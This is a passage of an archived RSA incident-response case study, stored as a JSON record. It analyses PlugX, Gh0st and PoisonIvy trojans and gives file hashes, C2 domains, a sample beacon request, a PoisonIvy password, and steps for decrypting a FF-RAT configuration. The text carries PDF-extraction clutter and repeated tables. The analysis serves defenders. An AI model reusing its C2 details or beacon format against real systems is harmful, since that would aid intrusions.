Time|\n|---|---|---|---|---|\n|ngpqdasi_kl.dll|101376|071B2A2CF343A62EC7C75592362593BC|Dec 03 2012 08:18:42 UTC|N/A|\n|lcruhypy_kl.dll|109568|E36DA01D2C47C308CDA5AF49272F3FBD|Dec 03 2012 08:20:05 UTC|N/A|\n|fmnonull.dat|61440|B7F87AF5AFF0A68DE408B112A5A95049|Dec 28 2012 07:59:48 UTC|N/A|\n|fmnonull.dat|165376|21C5FC01CED8B327A6AC1F31B90C525B|Dec 28 2012 07:59:18 UTC|N/A|\n\n\n-----\n\nRSA \r Incident \r Response Page \r 34\n\n###### 5.6 Trojan.PlugX\n\nRSA \r IR \r identified \r another \r malicious \r file \r that \r it \r refers \r to \r as \r Trojan.PlugX. \r  \r This \r Trojan \r is \r well \r documented \r in \r the \r security\ncommunity \r and \r has \r several \r capabilities \r including \r uploading/downloading \r files, \r executing \r commands, \r and \r listing \r processes.\nHere \r are \r the \r characteristics \r of \r the \r files \r related \r to \r this \r Trojan \r family:\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **C2 Nodes/Notes**\n```\n                                            Self-extracting\n b.exe 366734 3BC77F178ACC60A47106834658E78BCF [Feb 20 2011 ]\n                                    08:19:48 UTC executable\n                                            Sandboxie L.T.D\n iehelper.exe 14608 288B1C32B3B951C79E78F764DD1B08F8 [Jun 17 2012 ]\n                                    07:51:16 UTC loader file.\n                                            Sandboxie L.T.D\n sbiedll.dll 181760 86D7F18C89CEFE4C43DB9F38755CC33D [May 17 2013 ]\n                                    09:38:58 UTC file.\n                                            Obfuscated and\n helper.url 113874 1F8F685815648E3308EA096C1367BA27 N/A\n                                            compressed code\n                                            dns2.ipv6do.com\n [final.dll] 154112 35958c670840819889f18a69db72ac3b [Oct 17 2012 ]\n                                    08:33:02 UTC up.outhmail.com\n\n```\n**Table \r 11: \r Trojan.PlugX \r -­‐ \r file \r details \r and \r C2 \r channels**\n\nFile \r b.exe, \r which \r is \r a \r self-­‐extracting \r file, \r is \r the \r dropper \r for \r this \r variant \r of \r Trojan.PlugX. \r The \r archive \r contains \r three \r files\niehelper.exe, \r sbiedll.dll, \r and \r helper.url. \r  \r The \r first \r two \r files \r are \r loaders \r for \r the \r third \r file, \r which \r is \r obfuscated \r shellcode. \r  \r The\ntwo \r loader \r files \r iehelper.exe \r (which \r is \r signed \r by \r SANDBOXIE \r L.T.D) \r and \r sbiedll.dll \r are \r files \r used \r by \r Sandboxie, \r an \r isolated\noperating \r environment, \r which \r attempts \r to \r protect \r users \r from \r malicious \r programs. \r  \r The \r iehelper.exe \r file \r will \r load \r and \r start\nthe \r shiedll.dll, \r which \r injects \r the \r code \r contained \r in \r helper.url \r into \r a \r running \r process.\n\nAfter \r the \r iehelper.exe \r and \r sbiedll.dll \r files \r have \r been \r executed, \r the \r data \r from \r the \r helper.url \r file \r will \r be \r injected \r into \r a \r running\nprocess. \r  \r The \r helper.url \r file \r contains \r raw \r shell \r code, \r which \r has \r two \r layers \r of \r obfuscation. \r  \r The \r first \r layer \r of \r deobfuscation\nstarts \r with \r XORing \r 113842 \r bytes \r of \r data \r in \r helper.url \r with \r the \r 0xC0. \r  \r The \r second \r stage \r of \r deobfuscation \r is \r more \r complex,\ninvolving \r a \r series \r of \r mathematical \r operations \r on \r the \r data, \r as \r well \r as \r decompressing \r a \r portion \r of \r the \r data \r of \r helper.url \r using\nRTLDecompressBuffer \r API \r call. \r  \r Once \r these \r steps \r are \r performed \r a \r DLL \r file \r is \r produced \r (given \r the \r name \r final.dll) \r which \r is \r the\nactual \r Trojan.PlugX \r file. \r  \r This \r Trojan \r has \r been \r configured \r to \r beacon \r out \r to \r dns2.ipv6do.com \r and \r up.outhmail.com. \r  \r Here \r is \r a\nsample \r beacon \r from \r this \r Trojan:\n```\n    POST /update?id=000f7578 HTTP/1.1\n    Accept: */*\n    X-Session: 0\n    X-Status: 0\n    X-Size: 61456\n    X-Sn: 1\n    User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; .NET4.0C; .NET4.0\n    E; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)\n    Host: dns2.ipv6do.com\n    Content-Length: 0\n    Connection: Keep-Alive\n    Cache-Control: no-cache\n\n###### 5.7 Trojan.Gh0st\n\n```\nRSA \r IR \r identified \r remnants \r of \r what \r it \r refers \r to \r as \r Trojan.Gh0st. \r  \r One \r of \r the \r variants \r was \r digitally \r signed, \r but \r the \r certificate \r is\nno \r longer \r valid. \r  \r Both \r variants \r consisted \r of \r a \r separate \r configuration \r file \r that \r contained \r the \r C2 \r information. \r  \r All \r recovered\nconfiguration \r files \r contained \r the \r same \r C2 \r node: \r ru.pad62.com. \r  \r Malware \r analysis \r shows \r the \r Gh0st \r magic \r string \r Drag0n \r in \r its\ninitial \r beacon \r in \r network \r traffic.\n\n|File Name|Size|MD5 Hash|Compile Time|C2 Nodes/Notes|\n|---|---|---|---|---|\n|b.exe|366734|3BC77F178ACC60A47106834658E78BCF|Feb 20 2011 08:19:48 UTC|Self-extracting executable|\n|iehelper.exe|14608|288B1C32B3B951C79E78F764DD1B08F8|Jun 17 2012 07:51:16 UTC|Sandboxie L.T.D loader file.|\n|sbiedll.dll|181760|86D7F18C89CEFE4C43DB9F38755CC33D|May 17 2013 09:38:58 UTC|Sandboxie L.T.D file.|\n|helper.url|113874|1F8F685815648E3308EA096C1367BA27|N/A|Obfuscated and compressed code|\n|[final.dll]|154112|35958c670840819889f18a69db72ac3b|Oct 17 2012 08:33:02 UTC|dns2.ipv6do.com up.outhmail.com|\n\n\n-----\n\nRSA \r Incident \r Response Page \r 35\n\n**Figure \r 56: \r Trojan.Gh0st \r magic \r string**\n\nTrojans \r with \r signer \r name: **Shanghai \r Qiangwang \r Technology \r Co., \r Ltd**\nCertificate \r Serial \r Number: \r 027c0d1cecf1e7e82eb89fc3d5512613\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **Signing Time**\n```\n                                               Jun 4 2012\n [Omitted]x.exe 156161 C2E664463269D9A4E5E1F201DA867E0F [Apr 03 2012 ]\n                                     09:59:50 UTC 1:17:57 AM\n                                               Jul 07 2012\n 6to4adv.dll 113264 4E5C58E519AF4DB9CD444350A4241D5A [Jul 07 2012 ]\n                                     05:01:37 UTC 12:23:03 AM\n                                               Jul 07 2012 \n BusMgr.sys 30192 284295406F74C7831AA58EF46F3AD10B [Jun 27 2012 ]\n                                     14:43:21 UTC 8:59:31 AM\n\n```\n**Table \r 12: \r Digitally \r Signed \r Trojan.Gh0st \r file \r details**\n\n**Unsigned \r Trojan.Gh0st \r files**\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **Notes**\n```\n                                               Artificially\n MSODBC.dll 51232768 2F08BFF22FD8F3D264AE72BBC4EF7AD9 [May 15 2012 ]\n                                     06:24:15 UTC increased size\n msodbc.dll 32768 1F206932514C3ADDC94160F27170AC7F [May 15 2012 ] Actual PE size\n                                     06:24:15 UTC\n\n```\n**Table \r 13: \r Unsigned \r Trojan.Gh0st \r file \r details**\n\n###### 5.8 Trojan.PoisonIvy\n\nRSA \r IR \r discovered \r two \r active \r variants \r of \r PoisonIvy. \r  \r This \r Trojan \r is \r well \r documented \r in \r the \r security \r community \r and \r has\nseveral \r capabilities \r including \r uploading/downloading \r files, \r executing \r commands, \r and \r listing \r processes, \r observe/control \r the\nuser’s \r GUI, \r keystroke \r logging, \r etc. \r  \r Here \r are \r the \r characteristics \r of \r the \r files \r related \r to \r this \r Trojan \r family:\n\n**File Name** **Size** **MD5 Hash** **Compile Time** **C2 Nodes/Notes**\n```\n dbServer.exe 32768 8adcbec6614fdcb297311e7dd5dc3de3 [Apr 27 2013 ]\n                                    13:50:00 UTC [Loader ]\n res.db 22528 981ebda6cf315af63ed46e2a367c0b2b N/A Obfuscated DLL\n                                            Decrypted version of\n Decryp_res.db 22538 bd864c39cb8118356b061f4843a39add [Apr 27 2013 ]\n                                    13:37:59 UTC res.db\n memshare.dat 7099 4aefaac9f96c01398ad96ebe8ad5c5f3 N/A Obfuscated code\n timebios.dll 20448 18f55f3533101f8c0dce96c070d22736 [Jan 28 2013 ]\n                                    10:14:25 UTC [Loader ]\n share.dat 6710 561130a9d3e483b397ff12e8dd3a1a32 N/A Obfuscated code\n\n```\n**Table \r 14: \r Trojan.PoisonIvy \r -­‐ \r file \r details**\n\nThe \r PoisonIvy \r password \r chosen \r for \r both \r of \r these \r samples \r of \r PoinsoIvy \r was: **15911117665. \r  \r Both \r samples \r beacon \r out \r to:**\n**2012jg.sony36.com. \r  \r The \r communication \r protocol \r did \r not \r deviate \r from \r the \r standard \r PoisonIvy \r protocol \r that \r is \r also \r publicly**\navailable. \r  \r In \r fact \r the \r publicly \r available \r PoisonIvy \r server \r will \r interact \r with \r a \r system \r infected \r with \r this \r Trojan. \r  \r Below \r is \r the\nconfiguration \r information \r in \r memory \r that \r shows \r the \r PoisonIvy \r C2 \r node \r and \r the \r password:\n\n**Figure \r 57: \r Trojan.PoisonIvy \r -­‐ \r Memory \r snippet \r containing \r password**\n\n|File Name|Size|MD5 Hash|Compile Time|Signing Time|\n|---|---|---|---|---|\n|[Omitted]x.exe|156161|C2E664463269D9A4E5E1F201DA867E0F|Apr 03 2012 09:59:50 UTC|Jun 4 2012 1:17:57 AM|\n|6to4adv.dll|113264|4E5C58E519AF4DB9CD444350A4241D5A|Jul 07 2012 05:01:37 UTC|Jul 07 2012 12:23:03 AM|\n|BusMgr.sys|30192|284295406F74C7831AA58EF46F3AD10B|Jun 27 2012 14:43:21 UTC|Jul 07 2012 8:59:31 AM|\n\n|File Name|Size|MD5 Hash|Compile Time|Notes|\n|---|---|---|---|---|\n|MSODBC.dll|51232768|2F08BFF22FD8F3D264AE72BBC4EF7AD9|May 15 2012 06:24:15 UTC|Artificially increased size|\n|msodbc.dll|32768|1F206932514C3ADDC94160F27170AC7F|May 15 2012 06:24:15 UTC|Actual PE size|\n\n|File Name|Size|MD5 Hash|Compile Time|C2 Nodes/Notes|\n|---|---|---|---|---|\n|dbServer.exe|32768|8adcbec6614fdcb297311e7dd5dc3de3|Apr 27 2013 13:50:00 UTC|Loader|\n|res.db|22528|981ebda6cf315af63ed46e2a367c0b2b|N/A|Obfuscated DLL|\n|Decryp_res.db|22538|bd864c39cb8118356b061f4843a39add|Apr 27 2013 13:37:59 UTC|Decrypted version of res.db|\n|memshare.dat|7099|4aefaac9f96c01398ad96ebe8ad5c5f3|N/A|Obfuscated code|\n|timebios.dll|20448|18f55f3533101f8c0dce96c070d22736|Jan 28 2013 10:14:25 UTC|Loader|\n|share.dat|6710|561130a9d3e483b397ff12e8dd3a1a32|N/A|Obfuscated code|\n\n\n. \r  \r The \r communication \r protocol \r did \r not \r deviate \r from \r the \r standard \r PoisonIvy \r protocol \r that \r is \r also \r publicly\navailable. \r  \r In \r fact \r the \r publicly \r available \r PoisonIvy \r server \r will \r interact \r with \r a \r system \r infected \r with \r this \r Trojan. \r  \r Below \r is \r the\nconfiguration \r information \r in \r memory \r that \r shows \r the \r PoisonIvy \r C2 \r node \r and \r the \r password:\n\n\n-----\n\nRSA \r Incident \r Response Page \r 36\n\nHere \r is \r a \r screenshot \r from \r the \r PoisonIvy \r server \r after \r a \r system \r infected \r with \r this \r Trojan.PoisonIvy \r connected \r to \r it:\n\n**Figure \r 58: \r PosionIvy \r server \r side**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 37\n\n#### 6. Conclusion\n\nThis \r case \r study \r shows \r the \r typical \r flow \r of \r an \r investigation \r using \r ECAT \r and \r Security \r Analytics, \r which \r give \r RSA \r IR \r the \r visibility \r needed\nto \r successfully \r and \r efficiently \r investigate \r intrusions \r with \r the \r intent \r of \r successful \r remediation. \r  \r Only \r with \r full \r network \r and \r endpoint\nvisibility \r can \r investigators \r ensure \r they’ve \r identified \r all \r malware \r deployed \r or \r C2 \r channels \r used \r by \r an \r adversary. \r Additionally, \r this\nvisibility \r is \r critical \r after \r remediation \r of \r the \r intrusion, \r as \r APT \r adversaries \r will \r try \r to \r reenter \r the \r environment. \r Most \r APT \r groups \r are\npolitically \r or \r economically \r motivated, \r state \r sponsored, \r highly \r skilled, \r and \r therefore \r capable \r of \r sustaining \r long-­‐term \r campaigns\nagainst \r their \r intended \r targets. \r By \r having \r proper \r visibility \r over \r the \r network \r you \r will \r be \r able \r to \r proactively \r identify \r new \r infections \r and\nmore \r rapidly \r remediate \r them, \r reducing \r your \r exposure \r and \r the \r adversary’s \r opportunity \r to \r steal \r or \r manipulate \r more \r data. \r Traditional\nforensics, \r a.k.a \r dead-­‐box \r forensics, \r is \r not \r suitable \r for \r the \r nature \r of \r today’s \r intrusions \r because \r it \r is \r too \r slow \r and \r a \r very \r reactive\nprocess. \r An \r RSA \r IR \r analyst \r can \r triage \r a \r remote \r system \r in \r 10 \r – \r 20 \r minutes \r and \r without \r affecting \r the \r endpoint. \r A \r traditional \r forensic\nprocess \r will \r not \r even \r have \r an \r image \r acquired \r in \r that \r time, \r not \r to \r mention \r the \r user \r disruption.\n\nWhile \r other \r defense \r mechanisms \r such \r as \r perimeter \r controls \r and \r education \r of \r users \r are \r extremely \r important \r at \r preventing \r an\nintrusion, \r the \r next \r line \r of \r defense \r is \r quick \r detection \r of \r malicious \r activity \r once \r prevention \r fails. \r It \r is \r this \r proactive \r approach \r at\nreviewing \r both \r network \r traffic \r and \r endpoints \r for \r signs \r of \r malicious \r activity \r that \r gives \r companies \r the \r best \r chance \r at \r quickly\nidentifying \r malicious \r activity.\n\nECAT \r cuts \r down \r the \r analysis \r time \r by \r allowing \r analysts \r to \r whitelist \r files \r that \r have \r already \r been \r analyzed \r or \r are \r trusted, \r focusing \r the\nanalysis \r on \r only \r new \r files \r that \r appear \r on \r the \r endpoints. \r Furthermore, \r ECAT \r uses \r a \r variety \r of \r techniques \r to \r distinguish \r between\nsuspicious \r and \r normal \r activity \r in \r both \r memory \r and \r on \r disk, \r enabling \r the \r analyst \r to \r focus \r on \r the \r most \r suspicious \r activity. \r ECAT’s\nability \r to \r process \r Yara \r signatures \r is \r also \r an \r extremely \r useful \r feature \r that \r not \r only \r allows \r a \r company \r to \r incorporate \r their \r own\nintelligence \r into \r the \r product, \r but \r also \r import \r signatures \r from \r other \r intelligence \r groups \r that \r share \r these \r signatures. \r Lastly, \r ECAT\nallows \r the \r analyst \r to \r quickly \r triage \r endpoints \r by \r analyzing \r their \r MFTs. \r As \r has \r been \r illustrated \r in \r many \r examples \r in \r this \r report,\nwhenever \r a \r malicious \r artifact \r is \r found \r in \r a \r system, \r a \r quick \r triage \r is \r necessary \r because \r it \r can \r reveal \r many \r other \r artifacts \r such \r as \r signs\nof \r data \r exfiltration \r and \r remnants \r of \r older \r Trojans.\n\nSecurity \r Analytics \r complements \r ECAT \r by \r allowing \r the \r analyst \r to \r look \r for \r anomalies \r in \r the \r communication \r protocols \r used \r by\nmalware, \r or \r if \r the \r C2 \r channels \r are \r dormant, \r by \r identifying \r beaconing \r behavior. \r This \r is \r a \r very \r powerful \r approach \r that \r nets \r many \r of\nthe \r C2 \r channels \r in \r an \r incident.\n\n\n-----\n\nRSA \r Incident \r Response Page \r 38\n\n#### 7. Appendix I\n\nTrojan.FF-­‐RAT \r consists \r of \r a \r configuration \r file \r that \r in \r this \r case \r was \r always \r found \r under: \r C:\\Windows\\Media\\Windows \r Config.wav.\nThis \r configuration \r file \r is \r RC4 \r encrypted \r and \r aPACK \r compressed. \r  \r This \r section \r will \r demonstrate \r how \r an \r analyst \r can \r decrypt \r and\ndecompress \r this \r file \r to \r reveal \r the \r configuration \r information.\n\nFirst \r we \r need \r to \r understand \r the \r structure \r of \r an \r aPACK \r compressed \r file. \r  \r So, \r we \r start \r with \r a \r test \r file \r that \r we \r compress \r using \r the\nappack.exe[12] \r utility.\n\n**Figure \r 59: \r Plaintext \r file**\n\nNext \r we \r use \r the \r appack.exe \r utility \r to \r compress \r this \r file \r by \r running: **appack.exe \r c \r test.txt \r test.ap32. \r  \r The \r aPACK \r compressed \r file**\nconsists \r of \r the \r following \r structure:\n\n-­‐ `1[st] DWORD – aPACK magic header`\n-­‐ `2[nd] DWORD – Total Header length (i.e. the first 6 DWORDs)`\n-­‐ `3[rd] DWORD – Length of compressed data`\n-­‐ `4[th] DWORD – CRC32 hash of compressed data`\n-­‐ `5[th] DWORD – Length of decompressed data`\n-­‐ `6[th] DWORD – CRC32 hash of decompressed data`\n-­‐ `The rest of the bytes are the compressed data.`\n\nThis \r structure \r is \r depicted \r below:\n\n**Figure \r 60: \r aPACK \r file \r structure**\n\nNow \r we \r go \r back \r to \r a \r sample \r Windows \r Config.wav \r file. \r  \r This \r file \r has \r the \r following \r structure:\n\n-­‐ `1[st] DWORD – Hardcoded value (0x19860609), which may represent a date, that is,`\n```\n    YYYYMMDD or YYYYDDMM.\n\n```\n-­‐ `2[nd] DWORD – Obfuscated RC4 key. De-obfuscated by XOR-ing with 1[st] DWORD.`\n-­‐ `3[rd] DWORD – NULLs`\n-­‐ `4[th] DWORD – Same hardcoded value as 1[st] DWORD.`\n-­‐ `5[th] DWORD – Length of compressed data`\n-­‐ `6[th] DWORD – Length of decompressed data.`\n\n12\nhttp://www.ibsensoftware.com/files/aPLib-­‐1.01.zip\n\n\n**Figure \r 60: \r aPACK \r file \r structure**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 39\n\n-­‐ `The rest of the data is aPACK compressed and RC4 encrypted (offset 0x18 – end)`\n\nThis \r structure \r is \r demonstrated \r below:\n\n**Figure \r 61: \r Trojan.FF-­‐RAT \r configuration \r file \r structure**\n\nThe \r RC4 \r key \r is \r derived \r by \r XOR-­‐ing \r the \r first \r two \r DWORDs. \r  \r In \r this \r case: \r 0x19860609 \r XOR \r 0x19865733 \r = \r 0x0000513A. \r  \r The \r Trojan\nthen \r prints \r the \r ASCII \r version \r of \r 0x0000513A, \r so \r essentially \r our \r RC4 \r key \r is \r 64-­‐bits \r long \r as \r shown \r below:\n\n**Figure \r 62: \r Trojan.FF-­‐RAT \r RC4 \r key \r example**\n\nSo \r using \r RC4 \r key \r 0x3030303035313341 \r we \r now \r decrypt \r the \r data \r in \r the \r Windows \r Config.wav \r file \r starting \r at \r file \r offset \r 0x18 \r until \r the\nend. \r  \r The \r decryption \r operation \r results \r in \r this \r data:\n\n**Figure \r 63: \r Trojan.FF-­‐RAT \r RC4 \r decrypted \r configuration \r file**\n\n\n**Figure \r 61: \r Trojan.FF-­‐RAT \r configuration \r file \r structure**\n\n\n**Figure \r 62: \r Trojan.FF-­‐RAT \r RC4 \r key \r example**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 40\n\nThe \r RC4 \r decrypted \r data \r is \r aPACK \r compressed \r but \r without \r the \r header. \r  \r We \r actually \r do \r have \r all \r the \r pieces \r of \r the \r header \r except \r one:\nthe \r CRC32 \r of \r the \r decompressed \r data. \r  \r Lets \r list \r the \r structure \r of \r the \r aPACK \r compressed \r file \r to \r demonstrate \r by \r referencing \r figure \r 61:\n\n-­‐ `1[st] DWORD – AP32 (we can create this ourselves)`\n-­‐ `2[nd] DWORD – Length of the header (we can create this ourselves, i.e. 0x18000000)`\n-­‐ `3[rd] DWORD – Length of compressed data (we have this from the configuration file`\n```\n    figure 62 (i.e. 0xBE000000))\n\n```\n-­‐ `4[th] DWORD – CRC32 of compressed data (we can calculate this ourselves since we have`\n```\n    the data)\n\n```\n-­‐ `5[th] DWORD – Length of decompressed data (we have this from the configuration file`\n```\n    figure 62 (i.e. 0xC0060000))\n\n```\n-­‐ `6[th] DWORD – CRC32 of decompressed data (we have no way of knowing or calculating`\n```\n    this since we do not have the decompressed data)\n\n```\nSo, \r we \r are \r missing \r one \r critical \r piece \r of \r information, \r namely \r the \r CRC32 \r hash \r value \r of \r the \r decompressed \r data, \r and \r there \r is \r no \r way \r of\ngenerating \r or \r knowing \r this \r in \r advance \r since \r we \r are \r trying \r to \r decompress \r the \r data. \r  \r Lets \r put \r an \r aPACK \r header \r together \r with \r the\ninformation \r we \r have \r along \r with \r the \r data \r we \r decrypted \r (figure \r 64), \r and \r add \r NULLs \r for \r the \r 6[th] \r DWORD \r since \r we \r do \r not \r have \r this\ninformation:\n\n**Figure \r 64: \r RC4 \r decrypted \r configuration \r file \r with \r manually \r generated \r aPACK \r header**\n\nWhen \r we \r execute \r the \r appack.exe \r tool \r to \r decompress \r this \r file \r we \r get \r an \r error \r message:\n\n**Figure \r 65: \r appack.exe \r error \r message**\n\n\n**Figure \r 64: \r RC4 \r decrypted \r configuration \r file \r with \r manually \r generated \r aPACK \r header**\n\n\n-----\n\nRSA \r Incident \r Response Page \r 41\n\nIt \r is \r obvious \r that \r the \r appack.exe \r utility \r is \r throwing \r this \r error \r because \r the \r CRC32 \r of \r the \r decompressed \r data \r does \r not \r match \r what \r it\ncalculates \r after \r it \r is \r done \r decompressing \r the \r file. \r  \r So, \r we \r need \r to \r get \r around \r this \r error \r by \r identifying \r and \r modifying \r the \r code \r in\nappack.exe \r where \r this \r CRC32 \r hash \r check \r is \r made \r in \r order \r to \r make \r the \r utility \r continue \r executing \r regardless \r of \r whether \r the \r CRC32\nhash \r of \r the \r decompressed \r data \r matches \r what \r is \r on \r the \r header.\n\nA \r little \r debugging \r of \r this \r tool \r leads \r us \r to \r the \r code \r responsible \r for \r this \r CRC32 \r check. \r  \r The \r code \r is \r shown \r below:\n\n**Figure \r 66: \r Disassembly \r of \r appack.exe**\n\nAt \r address \r 0x00402C09 \r we \r see \r a \r conditional \r jump-­‐if-­‐equal \r (JE), \r which \r means \r that \r if \r the \r CRC32 \r hash \r of \r the \r decompressed \r data\nmatches \r the \r value \r of \r the \r 6[th] \r DWORD \r in \r the \r header, \r the \r jump \r will \r be \r taken. \r  \r We \r can \r modify \r the \r code \r of \r this \r utility \r to \r make \r the \r jump\nhere \r unconditional \r (JMP) \r thus \r make \r the \r utility \r think \r that \r the \r CRC32 \r check \r is \r always \r successful.\n\nWe \r can \r permanently \r patch \r the \r appack.exe \r file \r by \r using \r a \r Hex \r editor \r and \r changing \r byte \r 0x74 \r with \r 0xEB. \r  \r This \r particular \r instruction \r is\nlocated \r at \r file-­‐offset \r 0x2009 \r as \r shown \r below:\n\n**Figure \r 67: \r Patching \r appack.exe**\n\nNow, \r when \r we \r execute \r this \r patched \r version \r of \r appack.exe \r we \r successfully \r decompress \r any \r Trojan.FF-­‐RAT \r configuration \r file:\n\n\n-----\n\nRSA \r Incident \r Response Page \r 42\n\nThe \r relevant \r parts \r of \r the \r decrypted \r configuration \r file \r are \r shown \r below:\n\n**Figure \r 68:RC4 \r decrypted \r and \r aPACK \r decompressed \r Trojan.FF-­‐RAT \r configuration \r file**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/tjoi82cp4iq6xx561qcu3xjr2rmfgmo1"
    ],
    "report_names": [
        "RSA-IR-Case-Study(Apr-8-15)"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716491,
    "ts_updated_at": 1743041170,
    "ts_creation_date": 1428526578,
    "ts_modification_date": 1428526578,
    "files": {
        "pdf": "https://archive.orkl.eu/f2755e9e4e380e2a8357916862e145965c6e7365.pdf",
        "text": "https://archive.orkl.eu/f2755e9e4e380e2a8357916862e145965c6e7365.txt",
        "img": "https://archive.orkl.eu/f2755e9e4e380e2a8357916862e145965c6e7365.jpg"
    }
}